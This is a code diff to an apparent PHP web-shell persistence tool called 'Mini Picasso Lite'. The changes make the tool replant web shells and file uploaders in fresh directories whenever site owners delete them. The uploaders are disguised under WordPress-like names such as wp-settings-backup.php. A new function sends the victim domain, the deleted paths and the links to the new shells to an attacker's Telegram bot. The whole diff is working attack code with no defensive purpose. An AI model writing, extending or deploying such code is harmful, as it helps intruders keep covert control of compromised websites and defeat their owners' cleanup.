@@ -283,10 +283,46 @@ function uploadShellsLite($webRoot, $shellContent, $shellMarker, $maxShells) {
     
     $today = date('Y-m-d');
     $cache = getCacheData($webRoot, 'shells') ?? [];
+    $cacheTimestamp = $cache['timestamp'] ?? 0;
+    $cacheAge = time() - $cacheTimestamp;
     $shellMap = $cache['map'] ?? [];
     
     if (!empty($shellMap) && isset($cache['date']) && $cache['date'] === $today) {
         echo "Using cached locations from today\n";
+        
+        $status = detectUnexpectedDeletion($webRoot, $shellMap);
+        $deletedCount = count($status['deleted']);
+        $existingCount = count($status['existing']);
+        
+        if ($deletedCount > 0 && $cacheAge < 82800) {
+            echo "\n🚨 SHELL ADAPTIVE MODE!\n";
+            echo "Detected {$deletedCount} shell deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
+            
+            $allDirs = getDirsLite($webRoot, 2);
+            
+            $deletedDirs = array_keys($status['deleted']);
+            $availableDirs = array_filter($allDirs, function($dir) use ($webRoot, $deletedDirs) {
+                $subdirKey = str_replace($webRoot, '', $dir);
+                return !in_array($subdirKey, $deletedDirs);
+            });
+            
+            $selectedDirs = selectBestDirs($availableDirs, $deletedCount);
+            
+            $newShellMap = [];
+            foreach ($selectedDirs as $dir) {
+                $subdirKey = str_replace($webRoot, '', $dir);
+                $filename = generateLiteFilename($dir);
+                $newShellMap[$subdirKey] = $filename;
+            }
+            
+            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newShellMap);
+            
+            $shellMap = array_merge($status['existing'], $newShellMap);
+            
+            echo "🎯 Created {$deletedCount} NEW shell locations\n";
+            echo "✅ Kept {$existingCount} existing shells\n\n";
+        }
+        
     } else {
         echo "Scanning directories (lite mode: depth 2)...\n";
         $allDirs = getDirsLite($webRoot, 2);
@@ -338,10 +374,52 @@ function createLiteUploaders($webRoot, $uploaderContent, $maxUploaders) {
     
     $today = date('Y-m-d');
     $cache = getCacheData($webRoot, 'uploaders') ?? [];
+    $cacheTimestamp = $cache['timestamp'] ?? 0;
+    $cacheAge = time() - $cacheTimestamp;
     $uploaderMap = $cache['map'] ?? [];
     
     if (!empty($uploaderMap) && isset($cache['date']) && $cache['date'] === $today) {
         echo "Using cached uploader locations\n";
+        
+        $status = detectUnexpectedDeletion($webRoot, $uploaderMap);
+        $deletedCount = count($status['deleted']);
+        $existingCount = count($status['existing']);
+        
+        if ($deletedCount > 0 && $cacheAge < 82800) {
+            echo "\n🚨 UPLOADER ADAPTIVE MODE!\n";
+            echo "Detected {$deletedCount} uploader deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
+            
+            $allDirs = getDirsLite($webRoot, 2);
+            
+            $deletedDirs = array_keys($status['deleted']);
+            $availableDirs = array_filter($allDirs, function($dir) use ($webRoot, $deletedDirs) {
+                $subdirKey = str_replace($webRoot, '', $dir);
+                return !in_array($subdirKey, $deletedDirs);
+            });
+            
+            $selectedDirs = selectBestDirs($availableDirs, $deletedCount);
+            
+            $uploaderNames = [
+                'wp-settings-backup.php', 'theme-update-check.php',
+                'system-check.php', 'cache-compat.php',
+                'plugin-verify.php', 'update-core-verify.php'
+            ];
+            
+            $newUploaderMap = [];
+            foreach ($selectedDirs as $index => $dir) {
+                $subdirKey = str_replace($webRoot, '', $dir);
+                $uploaderName = $uploaderNames[$index % count($uploaderNames)];
+                $newUploaderMap[$subdirKey] = $uploaderName;
+            }
+            
+            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newUploaderMap);
+            
+            $uploaderMap = array_merge($status['existing'], $newUploaderMap);
+            
+            echo "🎯 Created {$deletedCount} NEW uploader locations\n";
+            echo "✅ Kept {$existingCount} existing uploaders\n\n";
+        }
+        
     } else {
         $allDirs = getDirsLite($webRoot, 2);
         $selectedDirs = selectBestDirs($allDirs, $maxUploaders);
@@ -393,6 +471,86 @@ function protectCache($webRoot) {
             @file_put_contents($htaccessFile, $content . $rules);
         }
     }
+}
+
+function detectUnexpectedDeletion($webRoot, $fileMap) {
+    $deleted = [];
+    $existing = [];
+    
+    foreach ($fileMap as $subdirKey => $filename) {
+        $filepath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
+        
+        if (file_exists($filepath)) {
+            $existing[$subdirKey] = $filename;
+        } else {
+            $deleted[$subdirKey] = $filename;
+        }
+    }
+    
+    return [
+        'deleted' => $deleted,
+        'existing' => $existing
+    ];
+}
+
+function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge, $newLocations = []) {
+    global $telegramBotToken, $telegramChatId;
+    
+    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
+    $hoursAgo = round($cacheAge / 3600, 1);
+    
+    $alertMessage = "🚨🚨🚨 <b>MINI PICASSO ALERT</b> 🚨🚨🚨\n";
+    $alertMessage .= "━━━━━━━━━━━━━━━━\n\n";
+    $alertMessage .= "🌐 <b>Domain:</b> {$domain}\n";
+    $alertMessage .= "⚠️ <b>Event:</b> File Deletion Detected\n\n";
+    $alertMessage .= "📊 <b>Details:</b>\n";
+    $alertMessage .= "  • Files deleted: <b>{$deletedCount}</b>\n";
+    $alertMessage .= "  • Time since update: <b>{$hoursAgo}h</b>\n\n";
+    
+    if ($deletedCount <= 5) {
+        $alertMessage .= "📝 <b>Deleted:</b>\n";
+        foreach ($deletedFiles as $subdir => $filename) {
+            $alertMessage .= "  • <code>{$subdir}/{$filename}</code>\n";
+        }
+        $alertMessage .= "\n";
+    }
+    
+    $alertMessage .= "🎯 <b>Adaptive Response:</b>\n";
+    $alertMessage .= "  ✅ Creating {$deletedCount} NEW locations\n";
+    $alertMessage .= "  ✅ Avoiding deleted paths\n";
+    $alertMessage .= "  ✅ Keeping existing files\n\n";
+    
+    if (!empty($newLocations)) {
+        $alertMessage .= "📂 <b>New Files:</b>\n";
+        foreach ($newLocations as $subdir => $filename) {
+            $url = "https://{$domain}{$subdir}/{$filename}";
+            $alertMessage .= "  • <a href=\"{$url}\">{$filename}</a>\n";
+        }
+        $alertMessage .= "\n";
+    }
+    
+    $alertMessage .= "⏰ " . date('Y-m-d H:i:s') . "\n";
+    $alertMessage .= "━━━━━━━━━━━━━━━━\n";
+    $alertMessage .= "<i>Mini Picasso Lite - Adaptive Mode</i>";
+    
+    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
+    $data = [
+        'chat_id' => $telegramChatId,
+        'text' => $alertMessage,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => false
+    ];
+    
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    @curl_exec($ch);
+    curl_close($ch);
+    
+    echo "🚨 Alert sent to Telegram!\n";
 }
 
 // ============================================
